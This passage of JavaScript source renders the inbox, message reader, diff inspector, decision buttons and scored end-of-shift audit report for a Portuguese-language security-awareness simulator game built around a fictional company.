        <div class="row-sender">${this.escapeHtml(item.senderName)}</div>
        <div class="row-content">
          ${!isProcessed ? '<span class="row-new-badge">NOVO</span>' : ''}
          <span class="row-subject">${this.escapeHtml(item.subject)}</span>
          <span class="row-snippet"> - ${this.escapeHtml(item.snippet)}</span>
        </div>
        <div class="row-time">${item.time}</div>
      `;

      row.addEventListener('click', () => {
        audio.openMail();
        this.openReader(index);
      });

      this.emailItemsContainer.appendChild(row);
    });

    if (this.emailItemsContainer.children.length === 0) {
      this.emailItemsContainer.innerHTML = `
        <div style="padding: 40px; text-align: center; color: #747775;">
          <div style="font-size: 32px; margin-bottom: 8px;">📭</div>
          <p>Nenhum item nesta fila de exibição.</p>
        </div>
      `;
    }
  }

  openReader(index) {
    const shift = this.getCurrentShift();
    const item = shift.scenarios[index];
    const isProcessed = this.processedItems.includes(index);

    this.inboxListView.style.display = 'none';
    this.emailReaderView.style.display = 'flex';
    this.technicalHeadersBox.style.display = 'none';
    this.btnToggleHeaders.textContent = 'Detalhes de Segurança ▾';

    let typeText = 'E-MAIL CORPORATIVO';
    if (item.channel === 'github') typeText = 'GITHUB PULL REQUEST';
    if (item.channel === 'iam') typeText = 'CHAMADO DE ACESSO IAM';
    if (item.channel === 'db') typeText = 'AUDITORIA DE BANCO TECHDB';
    if (item.channel === 'zap') typeText = 'TECHZAP WHATSAPP CHAT';
    if (item.channel === 'vault') typeText = 'DESPACHO TECHVAULT';

    this.readerTypeTag.textContent = typeText;
    this.readerTimeMeta.textContent = item.time;
    this.readerSubjectTitle.textContent = item.subject;

    this.readerSenderAvatar.textContent = item.avatarChar;
    this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
    this.readerSenderName.textContent = item.senderName;
    this.readerSenderEmail.textContent = `<${item.senderEmail}>`;
    this.readerReceivedTime.textContent = item.meta['Data'] || item.time;

    this.headerDe.textContent = item.meta['De'] || item.meta['Origem'] || item.meta['Contato'] || item.meta['Arquivo'] || '-';
    this.headerPara.textContent = item.meta['Para'] || item.meta['Endpoint'] || item.meta['Destino'] || '-';
    this.headerData.textContent = item.meta['Data'] || '-';
    this.headerAuth.textContent = item.meta['Segurança'] || item.meta['Status'] || item.meta['Prioridade'] || '-';

    this.readerBodyMessage.innerHTML = item.body;

    // Render Inspector
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO ANALISADO:</span>
          <span class="url-dest">${item.inspector.dest}</span>
          <small style="color: #cbd5e1; margin-top: 4px; display: block;">${item.inspector.details}</small>
        </div>
      `;
    }

    // Render Decision Buttons (Neutral without red/green spoilers)
    if (isProcessed) {
      this.decisionButtonsGroup.innerHTML = `
        <div style="font-size: 13px; color: #475569; font-weight: 600;">
          ✓ Este item já foi processado anteriormente durante este expediente.
        </div>
      `;
    } else {
      this.decisionButtonsGroup.innerHTML = item.actions.map(action => {
        return `
          <button class="btn-decision" data-action-id="${action.id}">
            ${action.label}
          </button>
        `;
      }).join('');

      this.decisionButtonsGroup.querySelectorAll('.btn-decision').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const actionId = e.currentTarget.getAttribute('data-action-id');
          const chosenAction = item.actions.find(a => a.id === actionId);
          this.processAction(index, item, chosenAction);
        });
      });
    }
  }

  processAction(index, item, action) {
    audio.actionDone();

    this.processedItems.push(index);
    const decisionRecord = {
      shiftNumber: this.getCurrentShift().shiftNumber,
      scenarioIndex: index,
      channel: item.channel,
      subject: item.subject,
      chosenActionLabel: action.label,
      logTitle: action.logTitle,
      correct: action.correct,
      consequence: action.consequence,
      explanation: action.explanation
    };

    this.decisionsHistory.push(decisionRecord);
    this.campaignHistory.push(decisionRecord);

    this.showToast(action.toastMsg);
    this.updateBadges();

    const shift = this.getCurrentShift();
    if (this.processedItems.length >= shift.scenarios.length) {
      setTimeout(() => {
        this.showShiftAuditReport();
      }, 700);
    } else {
      setTimeout(() => {
        this.showInboxList();
      }, 500);
    }
  }

  showToast(msg) {
    this.toastMsg.textContent = msg;
    this.actionToast.style.display = 'flex';
    setTimeout(() => {
      this.actionToast.style.display = 'none';
    }, 2400);
  }

  showShiftAuditReport() {
    audio.endFanfare();

    this.emailReaderView.style.display = 'none';
    this.inboxListView.style.display = 'none';
    this.auditReportView.style.display = 'flex';
    this.shiftClock.textContent = '18:00';
    this.taskbarClock.textContent = '18:00';

    const shift = this.getCurrentShift();
    const isFinalShift = this.currentShiftIndex === CAMPAIGN_SHIFTS.length - 1;

    const totalScenarios = this.decisionsHistory.length;
    const correctCount = this.decisionsHistory.filter(d => d.correct).length;
    const incorrectCount = totalScenarios - correctCount;

    const health = Math.max(0, 100 - (incorrectCount * 25));
    const reputation = Math.max(0, 100 - (incorrectCount * 15) + (correctCount * 5));

    this.reportThreatsAvoided.textContent = correctCount;
    this.reportThreatsTaken.textContent = incorrectCount;
    this.reportHealthFinal.textContent = `${health}%`;
    this.reportHealthFinal.className = health >= 75 ? 'card-num text-emerald' : (health >= 50 ? 'card-num text-amber' : 'card-num text-danger');
    this.reportReputationFinal.textContent = `${reputation} pts`;

    this.auditStamp.textContent = `TECHCORE CISO AUDIT // TURNO ${shift.shiftNumber}`;
    this.auditTitle.textContent = isFinalShift 
      ? '🏆 RELATÓRIO FINAL DA CAMPANHA DE DEFESA (4 TURNOS)' 
      : `Relatório de Desempenho - ${shift.title}`;
    this.auditSubText.textContent = `Expediente encerrado às 18:00. Avaliação do Turno ${shift.shiftNumber} de 4.`;

    if (incorrectCount === 0) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Aprovado com Louvor no Turno ${shift.shiftNumber}!`;
      this.auditVerdictText.textContent = 'Desempenho impecável! Você identificou e neutralizou 100% das ameaças sem comprometer a operação corporativa.';
    } else if (incorrectCount <= 1) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Turno ${shift.shiftNumber} Concluído com Ressalvas`;
      this.auditVerdictText.textContent = 'A operação sobreviveu, mas houve um incidente registrado. Revise o detalhamento pós-turno abaixo para se preparar.';
    } else {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Falha de Segurança Grave no Turno ${shift.shiftNumber}`;
      this.auditVerdictText.textContent = 'Múltiplos incidentes ocorreram neste turno. A integridade da infraestrutura foi severamente afetada.';
    }

    if (!isFinalShift) {
      const nextShiftNum = shift.shiftNumber + 1;
      this.btnNextShiftAction.style.display = 'inline-flex';
      this.btnNextShiftAction.textContent = `▶ Avançar para o Turno ${nextShiftNum} (${CAMPAIGN_SHIFTS[this.currentShiftIndex + 1].brandName})`;
      this.btnRestartShift.style.display = 'none';
    } else {
      this.btnNextShiftAction.style.display = 'none';
      this.btnRestartShift.style.display = 'inline-flex';
      this.btnRestartShift.textContent = '🔄 Reiniciar Campanha Completa (Do Turno 1)';
    }

    this.auditTableBody.innerHTML = this.decisionsHistory.map((item, idx) => `
      <tr>
        <td><strong>#${idx + 1}</strong></td>
        <td><span class="row-tag tag-${item.channel}">${item.channel.toUpperCase()}</span></td>
        <td><strong>${this.escapeHtml(item.subject)}</strong></td>
        <td>${this.escapeHtml(item.chosenActionLabel)}</td>
        <td><strong style="color: ${item.correct ? 'var(--google-green)' : 'var(--google-red)'};">${item.correct ? '✅ ACERTO' : '❌ INCIDENTE'}</strong></td>
        <td style="font-size: 11.5px; color: #444746; line-height: 1.4;">
          <strong>${this.escapeHtml(item.logTitle)}:</strong> ${this.escapeHtml(item.consequence)}<br>
          <em style="color: #747775;">${this.escapeHtml(item.explanation)}</em>
        </td>
      </tr>
    `).join('');
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
}

// Start Simulator
window.addEventListener('DOMContentLoaded', () => {
  window.simulator = new TechMailSimulator();
});
